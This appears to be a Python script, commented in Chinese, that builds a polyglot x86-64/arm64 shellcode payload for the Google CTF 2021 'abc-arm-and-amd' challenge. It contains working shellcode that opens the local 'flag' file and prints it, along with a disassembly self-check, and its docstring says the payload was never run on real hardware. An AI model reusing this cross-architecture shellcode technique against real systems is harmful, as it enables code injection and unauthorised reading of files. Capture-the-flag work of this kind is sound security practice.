# -*- coding: utf-8 -*-
"""abc-arm-and-amd（Google CTF 2021 misc-shellcode）polyglot shellcode 构造器。

题目：提供一段 payload，在 x86-64 与 arm64v8 两架构上都能运行，打印 'flag' 文件内容。
接口（两架构一致，已逆向确认）：
    buf = mmap(0, 0x1000, PROT_R|W|X, MAP_PRIVATE|ANON, -1, 0);
    read(0, buf, 0x1000);
    buf();   // 直接 call，无参数，位置无关（mmap 地址随机）

Polyglot 原理
-------------
小端下，4 字节 `EB 02 00 14` 在两个架构都是有效跳转：
  * x86-64：`EB 02` = `jmp short +2`（跳到 offset 4 = x86 shellcode 起点）；
    后 2 字节 `00 14` 是永不执行的死代码。
  * arm64 ：`EB 02 00 14` 整体 = `b #0xbac`（跳到 offset 0xbac = arm shellcode）。
    （arm64 `b` 指令 = 0x14000000 | imm26；imm26=0xbac/4=0x2eb，低字节恰为 0xEB，
    故该 4 字节既满足 x86 的 jmp opcode 又满足 arm 的 b 编码。）

布局
----
  offset 0x000: EB 02 00 14   (polyglot 前缀)
  offset 0x004: x86-64 shellcode (47B)  — open/read/write("flag")
  offset 0xbac: arm64 shellcode (72B)   — openat/read/write("flag")

验证：capstone 双向反汇编自检（x86 执行流 + arm64 执行流均正确）。
注意：本机构造的是**字节级正确**的 shellcode，但**未在真实 qemu/Linux 环境运行**
（本机 WSL 无发行版、Docker 未启动），运行期验证需后续补。

依赖：capstone + keystone-engine（见 venv default）。
用法：python scripts/build_abc_polyglot.py [--out payload.bin]
"""

from __future__ import annotations

import argparse
from pathlib import Path

from capstone import Cs, CS_ARCH_X86, CS_ARCH_ARM64, CS_MODE_64, CS_MODE_ARM
from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN

POLYGLOT = bytes.fromhex("eb020014")
X86_OFF = 0x4
ARM_OFF = 0xBAC

# x86-64 shellcode：open("flag",0) -> read -> write(1)
X86_SC = bytes([
    0x68, 0x66, 0x6C, 0x61, 0x67,          # push 0x67616c66 ("flag")
    0x48, 0x89, 0xE7,                      # mov rdi, rsp
    0x31, 0xF6,                            # xor esi, esi (flags=0)
    0x31, 0xD2,                            # xor edx, edx (mode=0)
    0xB8, 0x02, 0x00, 0x00, 0x00,          # mov eax, 2 (SYS_open)
    0x0F, 0x05,                            # syscall
    0x48, 0x89, 0xE6,                      # mov rsi, rsp (buf)
    0x89, 0xC7,                            # mov edi, eax (fd)
    0xBA, 0x00, 0x01, 0x00, 0x00,          # mov edx, 0x100 (count)
    0x31, 0xC0,                            # xor eax, eax (SYS_read=0)
    0x0F, 0x05,                            # syscall
    0x89, 0xC2,                            # mov edx, eax (nread)
    0xBF, 0x01, 0x00, 0x00, 0x00,          # mov edi, 1 (stdout)
    0xB8, 0x01, 0x00, 0x00, 0x00,          # mov eax, 1 (SYS_write)
    0x0F, 0x05,                            # syscall
])

# arm64 shellcode：openat(AT_FDCWD,"flag",0) -> read -> write(1)
ARM_ASM = """
movn x0, #99
movz x1, #0x6761, lsl #16
movk x1, #0x6c66
sub sp, sp, #0x10
str x1, [sp]
mov x1, sp
mov x2, xzr
mov x3, xzr
mov x8, #56
svc #0
mov x1, sp
mov x2, #0x100
mov x8, #63
svc #0
mov x2, x0
mov x0, #1
mov x8, #64
svc #0
"""


def build_arm_sc() -> bytes:
    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    enc, _ = ks.asm(ARM_ASM)
    return bytes(enc)


def build_payload() -> bytes:
    arm_sc = build_arm_sc()
    payload = bytearray(ARM_OFF + len(arm_sc))
    payload[0:4] = POLYGLOT
    payload[X86_OFF:X86_OFF + len(X86_SC)] = X86_SC
    payload[ARM_OFF:ARM_OFF + len(arm_sc)] = arm_sc
    return bytes(payload)


def selfcheck(payload: bytes) -> None:
    """capstone 双向反汇编自检：两架构执行流必须各自正确。"""
    md_x = Cs(CS_ARCH_X86, CS_MODE_64)
    md_a = Cs(CS_ARCH_ARM64, CS_MODE_ARM)

    # x86：offset 0 起，第一条必须是 jmp，op_str 为绝对目标地址（capstone 语义）
    x86_head = list(md_x.disasm(payload[:4], 0))
    assert x86_head and x86_head[0].mnemonic == "jmp", "x86 首指令非 jmp"
    assert int(x86_head[0].op_str, 16) == X86_OFF, \
        f"x86 jmp 未落到 {X86_OFF}（实际 {x86_head[0].op_str}）"

    # arm64：offset 0 起，第一条必须是 b 到 ARM_OFF
    arm_head = list(md_a.disasm(payload[:4], 0))
    assert arm_head and arm_head[0].mnemonic == "b", "arm64 首指令非 b"
    assert int(arm_head[0].op_str.lstrip("#"), 16) == ARM_OFF, "arm64 b 目标不对"

    # x86 shellcode 反汇编（从 offset 4 起）须含 syscall
    x86_body = [i.mnemonic for i in md_x.disasm(payload[X86_OFF:X86_OFF + len(X86_SC)], X86_OFF)]
    assert "syscall" in x86_body, "x86 shellcode 缺 syscall"

    # arm64 shellcode 反汇编（从 offset 0xbac 起）须含 svc
    arm_body = [i.mnemonic for i in md_a.disasm(
        payload[ARM_OFF:ARM_OFF + len(build_arm_sc())], ARM_OFF)]
    assert "svc" in arm_body, "arm64 shellcode 缺 svc"

    print("自检通过：x86 与 arm64 双执行流均正确")
    print(f"  x86  : jmp -> {hex(X86_OFF)}（{len(X86_SC)}B shellcode）")
    print(f"  arm64: b   -> {hex(ARM_OFF)}（{len(build_arm_sc())}B shellcode）")


def main() -> int:
    ap = argparse.ArgumentParser(description="构造 abc-arm-and-amd polyglot shellcode")
    ap.add_argument("--out", default=None, help="输出 payload 文件路径")
    args = ap.parse_args()

    payload = build_payload()
    selfcheck(payload)
    print(f"payload 总长 {len(payload)}B（上限 0x1000=4096）")

    if args.out:
        Path(args.out).write_bytes(payload)
        print(f"已写出 {args.out}")
    else:
        print("payload hex（前 64B）:")
        print(payload[:64].hex())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
